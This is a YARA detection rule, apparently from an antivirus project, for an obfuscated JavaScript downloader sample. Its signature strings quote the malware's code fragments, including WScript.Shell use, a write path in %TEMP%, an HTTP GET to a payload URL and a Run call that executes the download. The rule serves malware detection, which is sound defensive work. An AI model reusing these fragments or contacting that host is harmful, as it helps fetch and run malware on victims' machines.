rule sig_20160427_6dad70a11f82c0babca2b044250d8c77 {
  meta:
    description = "datamaliciousorder - file 20160427_6dad70a11f82c0babca2b044250d8c77.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "30075062061a6fd6109c35b3e3289f84a2d4a4a764d27183941531dd8cb43ddf"

  strings:
    $s1  = "function InrmdPmbki() {return HbgfcEmvqw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QLHjM9c" ascii
    $s2  = "function InrmdPmbki() {return HbgfcEmvqw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QLHjM9c" ascii
    $s3  = "function PpsjoGbged(MkyxkBzbwq, QkgayTgkdb){HfdkkGrqlu = HfdkkGrqlu * 1; return MkyxkBzbwq - QkgayTgkdb;};" fullword ascii
    $s4  = "var HbgfcEmvqw = function FcubbEsmvu() {return LpilkSveum[CcdbwDurpr](\"WScript\"+\".Shell\");}(), EmvcwOhzpi = 11;" fullword ascii
    $s5  = "MdugnCikzi[JjbsqZwkkb](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var LpilkSveum = this[\"WScript\"];" fullword ascii
    $s7  = "if (MdugnCikzi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FwuqvTubbj(){return IavtzLbgoj + \"\";};" fullword ascii
    $s9  = "function KpnqdMsace() {return ((NsbnwMstnu == true) && (NsbnwMstnu == RsghrQlknn)) ? 1 : HfdkkGrqlu;};" fullword ascii
    $s10 = "function DlploYfqjl(){return CcdbwDurpr;};" fullword ascii
    $s11 = "var NsbnwMstnu = false;" fullword ascii
    $s12 = "function CrkqeKlkvm(ObeliKmnjb){HbgfcEmvqw[\"R\"+\"un\"](ObeliKmnjb, HfdkkGrqlu, HfdkkGrqlu);};" fullword ascii
    $s13 = "var RsghrQlknn = false;" fullword ascii
    $s14 = "var IajlbAdbub = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "RsghrQlknn = true; " fullword ascii
    $s16 = "NsbnwMstnu = true; " fullword ascii
    $s17 = "var QnzqbToesf = false;" fullword ascii
    $s18 = "function GwhjqOphul(){return 23;};" fullword ascii
    $s19 = "}while (FtoqrHkhbc);" fullword ascii
    $s20 = "QnzqbToesf = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}